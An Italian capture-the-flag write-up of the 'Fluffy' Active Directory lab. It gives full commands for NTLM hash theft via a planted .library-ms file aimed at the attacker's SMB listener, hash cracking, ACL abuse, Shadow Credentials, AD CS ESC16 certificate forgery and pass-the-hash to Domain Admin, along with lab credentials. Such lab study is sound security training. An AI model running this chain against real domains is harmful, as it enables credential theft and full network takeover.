+++
date = '2026-07-10T18:20:47+02:00'
draft = false
title = 'Fluffy Writeup IT'
+++
**Nome**: **`joy.scd01`**

**Data**: **`11/08/2025`**

![Fluffy.png](/images/imgs_fluffy/Fluffy.png)

---
# Introduzione

**_Fluffy_** è un ambiente **Active Directory** di livello **Easy** che mette in mostra una kill chain moderna, fortemente incentrata sugli abusi delle **ACL** di e sui **Certificate Services**.

Parte con delle credenziali per un utente con bassi privilegi, consentendo l'enumerazione del dominio tramite **BloodHound**. Dopo aver identificato un possibile exploitation path, ho utilizzato un attacco di **NTLM Theft** su una share **SMB** con permessi di scrittura per catturare e craccare l'hash di un utente con privilegi più elevati.
Con il nuovo account, ho abusato dei permessi **`GenericAll`** e **`GenericWrite`** per scalare i privilegi lateralmente. Infine, ho puntato ad un account di servizio utilizzando un **Attacco Shadow Credential**, e ho abusato di un'errata configurazione degli **AD CS** (**Active Directory Certificate Services**) per estrarre l'hash del **Domain Administrator** e ottenere la compromissione totale del dominio.

---
# Tecniche Utilizzate

- **Raccolta Dati & Enumerazione BloodHound**

- **Cattura NTLM Hash (NTLM Theft)**

- **Attacco Shadow Credential**

- **AD CS Exploitation (ESC16)** 

- **Pass-The-Hash**

---
# Enumerazione

## nmap

Scansione iniziale di tutte le porte:

```bash
nmap -p- fluffy -Pn
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49689/tcp open  unknown
49690/tcp open  unknown
49700/tcp open  unknown
49706/tcp open  unknown
49717/tcp open  unknown
49736/tcp open  unknown
```

Scansione mirata con script e rilevamento servizi:

```bash
nmap -sC -sV fluffy -Pn
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-10 15:55:11Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-07-10T15:56:32+00:00; +7h00m00s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-10T15:56:31+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-10T15:56:32+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-10T15:56:31+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-10T15:55:52
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
```

Le scansioni hanno rivelato delle porte aperte standard per **Active Directory** (**DNS**, **Kerberos**, **LDAP**, **SMB**, **WinRM**).

Ho aggiunto **`fluffy.htb`** e **`dc01.fluffy.htb`** al mio file **`/etc/hosts`**.

## Validazione WinRM & Enumerazione SMB

Dato che questa è una macchina breachata, ho verificato le credenziali fornite (**`j.fleischman:J0elTHEM4n1990!`**) con i servizi **WinRM** e **SMB** utilizzando **NetExec**:

```bash
nxc winrm fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
```

![winrmfail.png](/images/imgs_fluffy/winrmfail.png)

```bash
nxc smb fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --shares
```

![smb.png](/images/imgs_fluffy/smb.png)

L'output ha rivelato l'accesso alla share **`IT`**.

# Accesso Iniziale & Movimento Laterale | BloodHound & NTLM Theft

Inizialmente, per mappare il dominio, ho raccolto i dati di **Active Directory** utilizzando **BloodHound**:

```bash
bloodhound-python -u j.fleischman -p 'J0elTHEM4n1990!' -ns 10.129.232.88 -d 'fluffy.htb' -c all --zip
```

![harvesting.png](/images/imgs_fluffy/harvesting.png)

Esaminando da **GUI**, ho analizzato gli utenti e una serie di account di servizio. Ho trovato un possibile percorso che coinvolgeva due utenti: **`j.coffe`** e **`p.agila`**. Entrambi appartengono al gruppo **`Service Account Manager`**.

![2users.png](/images/imgs_fluffy/2users.png)

Questo gruppo ha privilegi **`GenericAll`** sul gruppo **`service accounts`**, che a sua volta ha i privilegi **`GenericWrite`** su tre account di servizio specifici. Se fossi riuscito a compromettere **`p.agila`** o **`j.coffe`**, avrei potuto controllare quegli account di servizio.

![hound1.png](/images/imgs_fluffy/hound1.png)

![hound2.png](/images/imgs_fluffy/hound2.png)

# NTLM Theft

Quindi, sono tornato all'enumerazione **SMB** e mi sono connesso alla share **`IT`** utilizzando **smbclient**:

```bash
smbclient \\\\fluffy.htb\\IT -U j.fleischman
```

All'interno, ho trovato vari file, tra cui un **`.pdf`** specifico che ho scaricato.

Un annuncio di **Patching** indirizzato al **Dipartimento IT** riguardante degli aggiornamenti critici obbligatori. Il documento elenca diverse vulnerabilità recenti, evidenziando esplicitamente la **CVE-2025-24071**. Istruisce inoltre tutti gli amministratori a pianificare una finestra temporale di manutenzione.

**Nota**: _La **CVE-2025-24071** si riferisce a una vulnerabilità di **spoofing** e **information disclosure** in **Windows File Explorer**. Nello specifico, sfrutta la fiducia che **Explorer** ripone nei file **`.library-ms`**, **`.scf`**, o **`.url`** (in questo caso specifico **`.library-ms`**). Quando un utente visita semplicemente una cartella contenente quel file malevolo, **Explorer** tenta automaticamente di parsarlo per estrarne i metadati. Indirizzando questa richiesta di metadati verso un server **SMB** fittizio, forziamo la macchina della vittima a iniziare un'autenticazione in uscita, leakando di fatto il suo hash **NetNTLMv2** senza che l'utente clicchi o apra il file._

![cve.png](/images/imgs_fluffy/cve.png)

Ora, sapendo di avere i permessi di scrittura alla share **`IT`**, e sapendo che gli amministratori IT avrebbero probabilmente interagito con questa directory per coordinare il processo di patching, ho deciso di preparare un attacco di **NTLM Theft** per catturare i loro hash.

Ho generato i file malevoli utilizzando il tool di **Greenwolf**:

- **https://github.com/Greenwolf/ntlm_theft**

```bash
python3 -m venv venv

source venv/bin/activate

pip3 install xlsxwriter

python3 ntlm_theft.py -g libraryms -s 10.10.6.77 -f stars
```

Ho avviato **Responder** sulla mia interfaccia **VPN**:

```bash
sudo responder -I tun0
```

Successivamente, mi sono riconnesso alla share **`IT`** e ho caricato il payload:

```bash
smbclient \\\\fluffy.htb\\IT -U j.fleischman
mput stars.library-ms
```

![upload.png](/images/imgs_fluffy/upload.png)

Poco dopo, l'utente **`p.agila`** ha navigato nella share, e **Responder** ha catturato il suo **hash NetNTLMv2**.

![ntlmtheft.png](/images/imgs_fluffy/ntlmtheft.png)

Ho craccato l'hash utilizzando **John The Ripper**:

```bash
john hash --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt
```

![cracked.png](/images/imgs_fluffy/cracked.png)

---
# Privilege Escalation | ACL Abuse, Shadow Credentials & AD CS

Ora autenticato come **`p.agila`**, potevo abusare del percorso **ACL** precedentemente scoperto. Poiché **`p.agila`** è nel gruppo **`Service Account Manager`** (che ha **`GenericAll`** su **`service accounts`**), l'ho aggiunto direttamente a quel gruppo utilizzando **net rpc** seguendo la guida fornita da **BloodHound**:

```bash
net rpc group addmem "service accounts" "p.agila" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "dc01.fluffy.htb"
```

Ho verificato l'appartenenza al gruppo per assicurarmi che il comando avesse avuto successo:

```bash
net rpc group members "service accounts" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "dc01.fluffy.htb"
```

![added.png](/images/imgs_fluffy/added.png)

Dato che il gruppo **`service accounts`** ha permessi di **`GenericWrite`** su tre account di servizio, ho controllato **BloodHound** per capire quale fosse più worth it. Ho scoperto che **`ca_svc`** era un membro del gruppo **`Cert Publishers`**.

![certgroup.png](/images/imgs_fluffy/certgroup.png)

## Attacco Shadow Credential

**Nota**: _Avere **`GenericWrite`** su un account permette di modificare l'attributo **`msDS-KeyCredentialLink`**. Scrivendo la chiave pubblica in questo attributo, possiamo richiedere un **Ticket Granting Ticket** (**TGT**) per l'account target ed estrarre il suo **NT Hash**._

Ho utilizzato **certipy-ad** per eseguire automaticamente lo **Shadow Credential** contro **`ca_svc`** (**_Concatenando una serie di comandi per la sincronizzazione dell'orario con il DC per evitare errori di clock skew con Kerberos_**):

```bash
sudo systemctl stop systemd-timesyncd && sudo rdate -n fluffy.htb && sudo ntpdate fluffy.htb && certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account ca_svc -dc-ip 10.129.232.88 -dc-host 10.129.232.88
```

![ca_svcH.png](/images/imgs_fluffy/ca_svcH.png)

---
# AD CS Exploitation (ESC16)

Avendo il controllo su **`ca_svc`**, ho cercato template di certificati vulnerabili utilizzando **certipy-ad**:

```bash
sudo ntpdate fluffy.htb && certipy-ad find -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -vulnerable
```

![ca.png](/images/imgs_fluffy/ca.png)

L'output indicava che l'ambiente era vulnerabile all'**ESC16**, un attacco che coinvolge la manipolazione dell'**UPN**.

![vuln.png](/images/imgs_fluffy/vuln.png)

**Nota**: _Avendo permessi di scrittura sull'account **`ca_svc`** stesso, possiamo cambiare temporaneamente il suo **User Principal Name** per farlo corrispondere all'**UPN** del **Domain Administrator**. Possiamo quindi richiedere un certificato. La **CA** emetterà un certificato legato all'**UPN** richiesto, fornendoci di fatto un certificato valido per l'account **Administrator**._

**_Dopo averlo richiesto, dobbiamo ripristinare l'UPN per evitare che si creino conflitti e di rompere l'ambiente_**.

- **Step 1**: Ho aggiornato l'**UPN** dell'account **`ca_svc`** ad **administrator**:

```bash
sudo ntpdate fluffy.htb && certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -user ca_svc -upn administrator update -dc-ip 10.129.232.88 -dc-host 10.129.232.88
```

![update.png](/images/imgs_fluffy/update.png)

- **Step 2**: Ho richiesto un certificato utilizzando il **template User**:

```bash
sudo ntpdate fluffy.htb && certipy-ad req -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -ca FLUFFY-DC01-CA -template User -upn administrator -dc-ip 10.129.232.88 -dc-host 10.129.232.88
```

![request.png](/images/imgs_fluffy/request.png)

- **Step 3**: Ho ripristinato l'**UPN** al suo stato originale:

```bash
sudo ntpdate fluffy.htb && certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -user ca_svc -upn ca_svc update -dc-ip 10.129.232.88 -dc-host 10.129.232.88
```

- **Step 4**: Utilizzando il certificato **`.pfx`** ottenuto, mi sono autenticato al **Domain Controller** per estrarre l'**NT hash** dell'**Administrator**:

```bash
sudo ntpdate fluffy.htb && certipy-ad auth -dc-ip 10.129.232.88 -pfx administrator.pfx -username administrator -domain fluffy.htb
```

![adminhash.png](/images/imgs_fluffy/adminhash.png)

# Compromissione Totale del Sistema | Pass-The-Hash

Ho validato l'**NT Hash** utilizzandolo con **NetExec**:

```bash
nxc winrm fluffy.htb -u administrator -H '8d<REDACTED>6e'
```

**`(Pwn3d!)`**. 

Ho effettuato l'accesso utilizzando **Evil-WinRM**:

```bash
evil-winrm -i fluffy.htb -u administrator -H '8d<REDACTED>6e'
```

![systemproof.png](/images/imgs_fluffy/systemproof.png)

La root flag era situata in **`C:\Users\Administrator\Desktop\`**

La user flag era situata in **`C:\Users\winrm_svc\Desktop`**

---
# Considerazioni Finali

**_Fluffy_** è generalmente considerato un ambiente di livello **Medium**. Personalmente l'ho trovata più fedele al livello **Easy** perché la kill chain in sé non è eccessivamente complessa, ma richiede decisamente estrema precisione e attenzione ai dettagli in ogni singolo passaggio.
Per esempio, ho letto di molte persone che si bloccano durante lo sfruttamento della **ESC16** perché dimenticano di ripristinare l'**UPN** al suo stato originale (causando conflitti nell'ambiente), oppure per via di errori di clock skew di **Kerberos** perché non hanno sincronizzato il loro orario con il **Domain Controller** in anticipo (o non riescono apparentemente a farlo).

**Fonti**:

- **NTLM Theft (Greenwolf) | https://github.com/Greenwolf/ntlm_theft**